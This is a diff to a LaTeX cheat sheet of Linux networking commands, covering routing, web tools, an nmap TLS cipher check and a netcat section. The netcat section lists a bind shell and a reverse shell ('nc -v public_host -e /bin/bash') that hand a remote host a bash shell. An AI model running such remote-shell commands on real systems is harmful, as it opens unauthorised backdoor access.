@@ -221,7 +221,7 @@ Privilege port $<$ 1024 can be opened only by the root user!
 {\tt ip link set dev eth0 address AA:BB:CC:DD:EE:FF}
 \item Default gateway: 
 \startitemize
-	\item {\tt route add default gw 192.168.1.1 eth0}; 
+	\item {\tt route add default gw 192.168.1.1 eth0}
 	\item {\tt ip route add 192.168.1.0/24 dev eth0}
 	\item {\tt ip route add 192.168.1.0/24 via 192.168.1.1}
 \stopitemize
@@ -711,13 +711,13 @@ USERCTL=yes
 \item Server: {\tt nc -v -l -e /bin/bash}
 \item Client: {\tt nc {\sl host}}, {\tt telnet {\sl host} 31337} 
 \stopitemize
-\item Reverse telnet: 
+\item Reverse telnet:
 \startitemize
 \item Computer with public IP: {\tt nc -vv -l}  
-\item Computer behind firewall: {\tt nc -v {\sl host} -e /bin/bash}
+\item Computer behind firewall: {\tt nc -v {\sl public_host} -e /bin/bash}
 \stopitemize
 \stopitemize
- 
+
 \section{bash -- network support for shell scripting}
 
 \startitemize
@@ -802,6 +802,7 @@ USERCTL=yes
 \item Convert page to text: {\tt elinks -dump {\sl URL}}, {\tt lynx -dump {\sl URL}}
 \item Start HTTP server on port 9000 and share the current directory: {\tt python3 -m http.server 9000}
 \item Nginx test configuration: {\tt nginx -t -c {\sl config}}, dump config: {\tt nginx -T}
+\item Check provided SSLv3/TLS ciphers: {\tt nmap -sV --script ssl-enum-ciphers -p 443 {\sl hostname}}
 \stopitemize
 
 \section{OpenSSL}
